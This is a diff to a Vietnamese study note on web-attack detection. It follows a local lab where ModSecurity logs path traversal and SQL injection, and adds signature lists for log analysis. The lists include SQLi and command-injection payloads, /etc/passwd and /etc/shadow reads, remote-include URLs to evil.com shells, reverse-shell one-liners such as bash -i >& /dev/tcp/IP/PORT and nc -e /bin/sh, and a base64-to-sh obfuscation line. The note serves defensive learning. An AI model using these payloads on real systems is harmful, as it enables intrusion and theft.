@@ -48,7 +48,8 @@ var
 #### a) Path Traversal:
 - Được biết đến là 'directory traversal', lỗ hổng này cho phép attackers truy cập files và thư mục trên server nằm ngoài thư mục gốc. Nó thường được thực hiện bằng cách thao tác với các file path input fields trên một web app để truy cập files mà app cho phép truy cập, nhưng attacker không nên làm vậy. Loại tấn công này đạt được kết quả là các thông tin nhạy cảm như các files cấu hình và source code,... bị leak.
 - Ví dụ, cho rằng ta đang ở thư mục `/home/kali/`. Để thay đổi thư mục cha đến `/home`, ta phải gõ `cd ../`. Để tới được thư mục root, ta phải gõ `cd ../../`. Các concept tương tự này được dùng trong một path traversal attack, nơi một website cho phép truy cập đến các files nằm ngoài thư mộc root của website.
-> Thuật ngữ 'path traversal' thường được dùng thay cho Local File Inclusion (LFI), tuy nhiên cả hai là những lỗ hổng khác nhau, path traversal bị giới hạn việc đọc files trên server, trong khi đó LFI đề cập đến khả năng bổ sung để thực thi files đó trên server.
+> - Thuật ngữ 'Path Traversal' thường được dùng thay cho Local File Inclusion (LFI), tuy nhiên cả hai là những lỗ hổng khác nhau, Path Traversal bị giới hạn việc đọc files trên server, trong khi đó LFI đề cập đến khả năng bổ sung để thực thi files đó trên server.
+> - Dấu hiệu thường gặp: `../`, `/etc/passwd`
 - Để thử nó, đi đến http://127.0.0.1/images.php và nó sẽ hiển thị một số hình ảnh với một input field:
 ![image](https://hackmd.io/_uploads/HJhVSLqNZl.png)
 - Nếu ta enter đúng image name, web app sẽ hiển thị nó cho ta. Nhưng nếu ta thử enter một file name không phải của một image, ví dụ như `/etc/passwd`, nó sẽ in ra contents của nó. Tuy nhiên, ta chỉ cần add một số leading `../` trước file name `/etc/passwd` của ta:
@@ -639,7 +640,7 @@ Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] M
 
 #### c) SQL Injection (SQLi):
 - Trong một tấn công SQLi, attackers thao tác với website's input fields để submit malicious SQL code sắp thêm vào server.
-- Ví dụ, xem xét một website với trang login gồm username và password. Thông thường, website sẽ so sánh thông tin đăng nhập với thông tin được lưu trong database để xác định nếu user nên được cấp quyền truy cập. Nếu website's code có khả năng có lỗ hổng SQLi, attacker sẽ enter `' OR 1=1--` vào username, về cơ bản điều này sẽ đánh lừa database trả về tất cả bản ghi, bỏ qua bước kiểm tra xác thực.
+- Ví dụ, xem xét một website với trang login gồm username và password. Thông thường, website sẽ so sánh thông tin đăng nhập với thông tin được lưu trong database để xác định nếu user nên được cấp quyền truy cập. Nếu website's code có khả năng có lỗ hổng SQLi, attacker sẽ enter `' OR 1=1--` hay `UNION SELECT` vào username, về cơ bản điều này sẽ đánh lừa database trả về tất cả bản ghi, bỏ qua bước kiểm tra xác thực.
 - Đi tới http://127.0.0.1:9090/users.php để thử nghiệm và nó sẽ hiển thị một danh sách users với một input field để ta có thể research user bằng usernames của họ.
 - Để bắt đầu attack và tạo logs trên server, enter các payloads sau theo thứ tự:
     - `user1' and 1=1 #`
@@ -651,4 +652,104 @@ Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] M
 
 - Cả hai đều là POST requests, có thể check logs trong file `error.log`:
 ![image](https://hackmd.io/_uploads/HJGq9oiVbx.png)
-- Có thể thấy rằng, chạy lệnh `cat` với `grep` cho ta thấy trực tiếp hai sự cố SQLi được tdò ra bởi WAF. Chi tiết audit logs cho hai sự tìm thấy này có thể xem trong file `modsec_audit.log`.
+- Có thể thấy rằng, chạy lệnh `cat` với `grep` cho ta thấy trực tiếp hai sự cố SQLi được tdò ra bởi WAF. Chi tiết audit logs có thể xem trong file `modsec_audit.log`.
+> Thông thường `modsec_audit.log` sẽ có thể ghi request, response body và payload.
+
+## III. Một số dấu hiệu của attack:
+> Chuỗi tấn công thường gặp: Scan $\rightarrow$ Path Traversal $\rightarrow$ LFI $\rightarrow$ RCE $\rightarrow$ Webshell/Reverse Shell
+
+### 1. SQL Injection (SQLi):
+- Attacker chèn câu lệnh SQL vào input thường để bypass login, trích xuất dữ liệu, sửa hay xoá database.
+- Dấu hiệu:
+    - `' OR 1=1 --`
+    - `" OR "1"="1`
+    - `UNION SELECT`
+    - `SELECT * FROM`
+    - `information_schema`
+    - `sleep(5)`
+    - `benchmark(`
+    - `%27` (encode của `'`)
+- Log thường thấy: `access.log`, `database error log`
+
+### 2. Local File Inclusion (LFI):
+- Ứng dụng cho phép include file local trên server để đọc file nhạy cảm.
+- Dấu hiệu:
+    - `../`
+    - `/etc/passwd`
+    - `/etc/shadow`
+    - `/proc/self/environ`
+    - `file=../../etc/passwd`
+    - Encode:
+        - `%2e%2e%2f`
+        - `%252e%252e%252f`
+- Log thường thấy: `access.log`, `modsec_audit.log`, `error.log`
+
+### 3. Remote File Inclusion (RFI):
+- Ứng dụng include file từ server bên ngoài, thường để chạy webshell, có thể dẫn trực tiếp đến RCE.
+- Dấu hiệu:
+    - `http://evil.com/shell.txt`
+    - `https://attacker/shell.php`
+    - `file=http://`
+    - `include=http://`
+    - `allow_url_include`
+
+### 4. Path Traversal:
+- Thoát khỏi thư mục hiện tại để truy cập file ngoài phạm vi cho phép. Path Traversal là kỹ thuật, còn LFI là hậu quả.
+- Dấu hiệu:
+    - `../`
+    - `..\\`
+    - `/..;/`
+    - `..%2f`
+    - `..%5c`
+    - `/var/www/../../etc/passwd`
+
+### 5. Command Injection:
+- Chèn lệnh hệ điều hành vào input (thường trong PHP, bash wrapper).
+    - `; ls`
+    - `; id`
+    - `&& whoami`
+    - `|| uname -a`
+    - `| cat /etc/passwd`
+    - ``id``
+    - `$(id)`
+- Log thường thấy: `access.log`, `modsec_audit.log`
+
+### 6. Remote Code Execution (RCE):
+- Kẻ tấn công thực thi mã lệnh tùy ý trên server.
+- Dấu hiệu:
+    - `id`
+    - `whoami`
+    - `uname -a`
+    - `pwd`
+    - `bash -i`
+    - `/bin/bash`
+    - `/bin/sh`
+- Reverse Shell:
+    - `bash -i >& /dev/tcp/IP/PORT 0>&1`
+    - `nc -e /bin/sh`
+    - `nc IP PORT`
+    - `python -c 'import os; os.system(...)'`
+- Obfuscation:
+    - `%3B (;)`
+    - `%26%26 (&&)`
+    - `%7C%7C (||)`
+    - Base64: `echo aWQ= | base64 -d | sh`
+- Log thường thấy: `modsec_audit.log`, `error.log`
+
+### 7. Scan/Reconnaissance:
+- Giai đoạn do thám trước khi tấn công.
+- Đặc điểm:
+    - Nhiều request trong thời gian ngắn.
+    - `404` liên tục.
+    - Thay đổi User-Agent.
+- Dấu hiệu:
+    - `/phpmyadmin`
+    - `/wp-admin`
+    - `/admin`
+    - `/login`
+    - `/test`
+    - `/backup`
+    - `/config`
+    - `/old`
+    - `/.git/`
+    - `/.env`
